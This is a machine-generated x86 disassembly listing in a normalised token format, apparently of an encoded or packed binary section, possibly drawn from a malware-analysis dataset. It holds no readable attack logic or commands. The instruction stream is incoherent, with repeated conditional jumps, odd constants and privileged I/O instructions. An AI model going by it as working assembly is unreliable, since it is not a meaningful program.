jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e25a74
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bl bl
jb r-xdata
mov dl 0x88
loop r-xdata
jb r-xdata
or esi [ esi ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edx + 0x721d1d1a ]
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
or al 0xba
jb r-xdata
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
leave
test [ ebx - 0x49 ] ch
cmp al 0xb8
out 0xec al
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
jb r-xdata
or ebx eax
jb r-xdata
0x1dd1a688 0xa66f
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or bl cl
pop ebx
sbb eax 0xee26611d
sbb eax 0xe2e24a75
jb r-xdata
push ss
mov bl dl
jb r-xdata
pop edx
test [ 0x67bb1d1d ] dh
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ ebx ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and cl [ eax - 0x58947b34 ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + eax * 4 + 0x1d3e790b ] 0x1d
jb r-xdata
jb r-xdata
push ds
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
clc
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn 0x6b84
pop esp
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
adc ebp ebp
jb r-xdata
sbb bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
imul esp [ edi + 0x1ab20b0a ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
mov ebx 0x3caf6b84
or edx [ esi + 0x39 ]
sbb eax 0x7272721d
mov ebx 0x6b84cc88
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xchg edi eax
push ds
jb r-xdata
jb r-xdata
adc eax 0x72721d1d
jb r-xdata
aad 0xdc
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
push cs
loop r-xdata
imul esp [ edx + ebx * 4 + 0x1d36e50a ] 0x1d
cdq
cld
aaa
mov ch 0x6b
stosd [ edi ]
imul esi [ ecx ] 0xa46bb57c
or ah ch
cmp bl [ 0xffffffffa226611d ]
mov bl [ edx + eax * 4 ]
imul esp [ edi + 0x8330b1a ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ edx ] dl
jb r-xdata
jb r-xdata
jb r-xdata
adc bl [ 0x7272721d ]
imul edi [ edx ] 0x300b3967
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
jb r-xdata
in eax dx
mov ch 0x6b
jb r-xdata
mov bl 0x1d
xchg edx eax
0xbeaafe1 0x1b0
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
enter 0x3d69 0x84
loop r-xdata
js r-xdata
mov [ esp + eax * 4 + 0x69fea76b ] cl
and [ ebx ] cl
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
or esp [ ecx + 0x721d1d3d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb2069fe ] 0xffffffa7
jb r-xdata
out dx al
mov cl 0x1d
mov ah 0xd6
or edi esi
lahf
jb r-xdata
jb r-xdata
or al 0x13
jb r-xdata
in eax dx
ja r-xdata
imul ecx [ esi ] 0x88ee0e61
jb r-xdata
imul esp [ edi - 0x24dd2ee2 ] 0xffffffa7
push cs
xchg ebx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sti
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xdc0bb91a
jb r-xdata
loop r-xdata
or esi [ edx + eax * 8 ]
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
sbb eax 0xb51d0697
jb r-xdata
loop r-xdata
sbb eax 0x88ba7272
sbb eax 0xa688eab4
rcr [ 0xffffffffaec6a66f ] 0x1
mov ch 0xb2
or ah dh
pop eax
sbb eax 0xa680b1d
out 0xb al
mov al [ 0x721d1d2a ]
sbb al 0x84
imul ebx [ edi - 0x7be22efe ] 0x6b
loop r-xdata
jb r-xdata
loop r-xdata
or [ edi ] 0xf6a46bb5
or dl [ esi + 0x668a1d1d ]
sbb eax 0x8aa22661
sbb al 0x82
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ebx [ ebp + 0x72e2e2f4 ]
jb r-xdata
mov ecx 0x72727221
jb r-xdata
cmp [ bp + di ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6b774510 ] 0xffffff84
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ edx ] 0x66ed11d9
inc ebx
and ah dl
loop r-xdata
loop r-xdata
or edx [ ecx + 0x72721d1d ]
jb r-xdata
jb r-xdata
cmp [ ebx + ebp * 2 + 0x3d69c8bf ] eax
loop r-xdata
jb r-xdata
imul ebp edx 0xbeaafe1
mov al 0x1
sbb eax 0x7272721d
mov ch 0x1d
xchg edi eax
imul esp [ edi + 0x2af6f1a ] 0x1e921db3
sbb eax 0xd10a721d
adc bl [ 0x30fe8a1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x1a
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0x88
mov [ esp + eax * 4 - 0x45e95895 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ esi ] ebx
and ah [ edx - 0x1d0743f5 ]
jb r-xdata
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
loop r-xdata
jb r-xdata
push ds
xchg [ ebx + ebp * 2 - 0x7745f559 ] eax
mov [ ebx + ebp * 2 + 0xbba08a7 ] es
lodsd [ esi ]
adc bl [ 0x7272721d ]
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
or esi [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax 0xfb
loop r-xdata
mov ah 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax 0x72721d1d
jb r-xdata
jb r-xdata
or ah dl
sbb ebx [ 0xffffffffd912691d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
stosb [ edi ]
jb r-xdata
test [ ebx - 0x59 ] ch
movsd [ edi ] [ esi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x2069fea7 ] es
or esp [ edi + 0x72e2e2fc ]
jb r-xdata
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
loop r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov eax [ 0xffffffffe165e669 ]
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax - 0x36 ]
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
push cs
movlps [ 0x7272721d ] xmm3
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and al ah
test [ ecx - 0x22 ] ah
loop r-xdata
0xe2e68f0b 0x72e2
imul esp [ edx - 0x1ee41e06 ] 0x6b13e13b
mov dl al
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
imul edi [ edi - 0x23f446e6 ] 0xffffffc6
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop esi
rcl [ edx ] 0x1
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
std
mov dl ch
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ eax ] 0xe2fca70b
loop r-xdata
jb r-xdata
cdq
jb r-xdata
mov ah cl
shl [ edx ] 0x1
jb r-xdata
mov bh 0x2a
test [ ebx - 0x49 ] ch
adc [ eax + 0x6b848e88 ] bh
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
xchg edi eax
sbb eax 0x25690e97
or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
pop ss
mov dl ah
fcom [ 0x72721d1d ]
jb r-xdata
or cl [ edx ]
jb r-xdata
sbb cl cl
adc dh [ edi ]
jb r-xdata
out 0x65 al
jb r-xdata
inc esi
mov edi 0xb76b8442
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x721d1d38 0x7272
jb r-xdata
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
loope r-xdata
jb r-xdata
mov cl 0xb
not [ edi ]
sbb eax 0x7272721d
outsd
inc edx
pop ss
sbb eax 0xbb2b11d
retn 0xe2f7
jb r-xdata
sbb eax 0x7272721d
in eax dx
0xe2e2
popfd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
pop [ ebx + ebp * 2 - 0x77450759 ]
or edi edi
cli
loop r-xdata
test [ ebx - 0x59 ] ch
fistp [ ecx - 0x334cf436 ]
jb r-xdata
sbb bh [ ecx - 0x1d3923f5 ]
loop r-xdata
popad
jb r-xdata
sbb eax 0x30fe8a1d
jb r-xdata
or edi [ eax - 0x14 ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
fst [ ecx ]
jb r-xdata
in eax dx
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ecx + 0x3d ]
jb r-xdata
or esi [ ebx + 0x72e2e2cc ]
jb r-xdata
jb r-xdata
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xba72721d
jb r-xdata
xor eax 0xee8a1d1d
jb r-xdata
jl r-xdata
jb r-xdata
sbb eax 0x39d11269
fst [ ecx ]
loop r-xdata
sbb eax 0x6c66ed1d
jb r-xdata
jb r-xdata
0x1d3ac20b 0x721d
loope r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
imul esp eax 0x7221e3c9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ edx + 0x1ea76b84 ] edi
loope r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0xb30b
jb r-xdata
loop r-xdata
mov bh dh
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov ah 0x88
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
popad
jb r-xdata
int3
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
or ecx [ eax + 0x5c ]
mov [ edi + 0xca76b84 ] al
mov edx 0x2a698c88
jb r-xdata
jb r-xdata
sbb eax 0x214dee8a
jb r-xdata
popad
push es
sbb ah [ ebx + 0xe ]
loop r-xdata
adc edx [ ebx ]
jb r-xdata
jb r-xdata
loopne r-xdata
in eax dx
insb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x710bceb4
aas
or cl [ ebx - 0x44e2e2cc ]
mov bh 0x46
jb r-xdata
jb r-xdata
jb r-xdata
imul esp esi 0xeaa7e165
or eax edx
cmp bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947bbe ] 0x46
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb22671a ] 0xffffff9a
jb r-xdata
xchg al ch
loop r-xdata
and ch ch
call [ bx + di ]
sbb eax 0xbabe881d
test [ ebx - 0x59 ] ch
jb r-xdata
or ecx [ edi ]
jb r-xdata
sbb ah [ edi + 0x22 ]
adc ebp [ ebx - 0x59 ]
jb r-xdata
loop r-xdata
mov bl 0xcc
jb r-xdata
xor [ esi + 0x6b ] bl
jb r-xdata
out dx al
sbb eax 0xd912691d
popad
jb r-xdata
or ebp ebp
or bl [ 0x7272721d ]
retn 0xff0b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
loop r-xdata
sbb eax 0x7272721d
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
push edx
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
loop r-xdata
push cs
mov cl 0x1d
test [ esi - 0x1e ] 0x120be2e2
aaa
jb r-xdata
loop r-xdata
sbb eax 0xa725721d
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
insb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
mov ebx 0xed2267bd
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
inc edx
jb r-xdata
jb r-xdata
leave
shl [ edx ] 0x1
test [ ebx - 0x59 ] ch
sbb al 0x6f
cmpsd [ esi ] [ edi ]
adc dh [ edx + 0xaeaa769 ]
mov [ edi - 0x58947b46 ] al
sbb cl [ eax + 0x6b84ba9a ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax + 0x6b84ba87 ] cl
cmpsd [ esi ] [ edi ]
push ds
xchg [ edx + 0x1aa76b84 ] edi
mov [ edx - 0x58947b46 ] bl
inc eax
adc ebx [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ ebp + 0xb82a46b ] 0x79
jb r-xdata
imul esp [ edi + 0xb22d136 ] 0x58
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x61
jb r-xdata
and ch al
or ecx [ ebx + edx ]
push ss
mov edx 0x14a76b84
mov [ eax + 0x1d3d610b ] al
mov edx 0x6b849488
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
push cs
loop r-xdata
mov ecx 0xb469212b
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
stosd [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb4
mov ch 0xa
pop es
or esp edi
sbb [ 0x7272721d ] bl
or ecx [ ebx ]
loope r-xdata
jb r-xdata
out dx al
mov ch 0xbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x6f72721d
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1ea7611e ] 0xffffffe6
or eax ecx
retn 0xe2e2
mov dl 0x1d
mov ah 0xce
or esi [ ecx + 0x3f ]
jb r-xdata
sbb eax 0x67bdbbbb
imul esi [ edi + 0x348b0a46 ] 0x1d
jb r-xdata
loopne r-xdata
loop r-xdata
jb r-xdata
out 0xa1 al
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
nop [ 0x1d100f0b ] ebx
sbb eax 0x72727272
jb r-xdata
push esp
in eax 0xb2
arpl [ 0xffffffffe2e2e228 ] sp
outsd
add eax 0xb21d1d10
mov cl 0xb1
mov ch ah
mov cl 0x1d
jne r-xdata
and cl [ bp + di ]
jb r-xdata
mov [ edx ] esp
call 0x1d58be9a
sbb eax 0x12d10a72
0x8816a76f 0xbe2
jb r-xdata
mov dl 0xb4
jb r-xdata
jb r-xdata
sbb eax 0x88b4b4b2
jb r-xdata
jb r-xdata
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x1d
je r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
imul esp [ edi + 0x2a890b06 ] 0x1d
sbb eax 0xb80bf51d
pop edi
sbb eax 0x7272721d
jb r-xdata
mov ch 0x6b
jb r-xdata
mov ch 0xb2
loop r-xdata
jb r-xdata
push esp
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
0x6fe2e2e0 0x1a67
jb r-xdata
loop r-xdata
push cs
or eax [ ecx + 0x72e2e2fe ]
in eax dx
jl r-xdata
imul edx [ edx ] 0x11d939d1
popad
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
int3
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ edx + 0x721d1d38 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov dl ah
or eax [ edx ]
popad
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
imul ebx [ edi + 0x59f60b1a ] 0x1d
movsb [ edi ] [ esi ]
jb r-xdata
xor al 0x1d
mov ah 0xb5
or al [ edi ]
mov dl [ ebx ]
jb r-xdata
sbb al 0xb
jb r-xdata
or ecx [ es : eax + 0x1a ]
sbb bl [ bx ]
sbb eax 0xc2320b1d
loop r-xdata
push ds
sbb eax 0x2267aeb4
or edx [ ebx ]
adc ebx [ 0xffffffffa725721d ]
outsd
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
insb
mov [ edx - 0x20 ] 0xe2
loop r-xdata
or esp [ edx - 0x20 ]
leave
jb r-xdata
jb r-xdata
jb r-xdata
mov eax [ 0x18930bf6 ]
jb r-xdata
jb r-xdata
mov esi [ ebx - 0x424444e3 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
0x1d0f510a 0xb1d
loop r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x2267bdbb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
or bh [ eax ]
xor eax 0x2f8a1d1d
mul dl
loop r-xdata
fld [ edi - 0x5b9b1212 ]
mov dh 0x67
jb r-xdata
dec [ ebx + 0x26541da2 ]
jb r-xdata
push esp
jb r-xdata
sahf
jb r-xdata
sbb eax 0xb51d3e97
jb r-xdata
cmpsd [ esi ] [ edi ]
mov ah 0xae
and cl [ bp + di ]
jb r-xdata
jb r-xdata
adc [ edx + 0x1d0c110b ] bh
sbb eax 0x72727272
jb r-xdata
mov bh al
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
sbb eax 0x9269721d
fsubrp st1
adc ch ch
push ebp
mov dl 0x69
and al 0xa
jb r-xdata
test [ ecx - 0x26 ] ah
sbb eax 0xaa76f1d
jb r-xdata
jb r-xdata
sbb eax 0xbdbbbb1d
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
mov ebp 0x67ed2267
jb r-xdata
jb r-xdata
loop r-xdata
rol ebx 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ esi ]
and ch ch
jb r-xdata
test eax 0x72e2e2ff
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
out 0xe3 al
loop r-xdata
sbb eax 0x14d1b21d
jb r-xdata
0x26a79b22
jb r-xdata
movsb [ edi ] [ esi ]
mul [ ecx + 0x26 ]
out dx al
test [ ebx - 0x59 ] ch
or ebp [ edi - 0x3e ]
loop r-xdata
in ax 0xc7
and ch ch
jb r-xdata
sbb eax 0xb414d1b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ esi - 0x1e ]
loop r-xdata
je r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl dh
jb r-xdata
jb r-xdata
outsd
jb r-xdata
mov [ edx - 0x1d153ff5 ] dl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ ss : edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
adc edi edi
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ 0x72e2e2c7 ]
out dx al
adc eax 0xa222f93a
sub esp [ ecx ]
jb r-xdata
jb r-xdata
or ecx esp
adc al 0x1d
sbb eax 0x3b9d0a72
sbb eax 0x2267aeb5
or esp [ ebx + 0x35 ]
sbb eax 0x7272721d
mov ah dh
jecxz r-xdata
mov dl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
rcl [ esp + esi * 4 ] 0x1
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jb r-xdata
loop r-xdata
imul esi [ edi + 0x3e ] 0x6b1d1d1f
jbe r-xdata
and cl [ bp + di ]
arpl [ 0x72721d1d ] si
jb r-xdata
scasb [ edi ]
loop r-xdata
loop r-xdata
loop r-xdata
outsd
imul esp [ edi - 0x3d7745fa ] 0xffffff84
imul esp [ edi - 0x2f7745fc ] 0xffffff84
imul esp [ edi + 0xb4c0b0a ] 0x1d
sbb eax 0xfb0b7272
out 0xe2 eax
loop r-xdata
ja r-xdata
adc al 0xb4
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
bound eax [ esi - 0x1e ]
loop r-xdata
and ch dl
mov dl 0x1d
xchg edi eax
push es
sbb eax 0xac69feb5
0x7e0b
jb r-xdata
or cl [ ebx + 0x30 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x721d1d18 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x8a
jb r-xdata
jb r-xdata
fstp [ esi + 0x66edf6c6 ]
0x8ae2e2e2 0xd87a
mov ah 0xa
jb r-xdata
jb r-xdata
retn 0xe2e2
and cl [ ebx ]
jb r-xdata
or ebx [ eax - 0x3e ]
shl [ edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
pop ds
and cl [ bp + di ]
cli
jb r-xdata
jb r-xdata
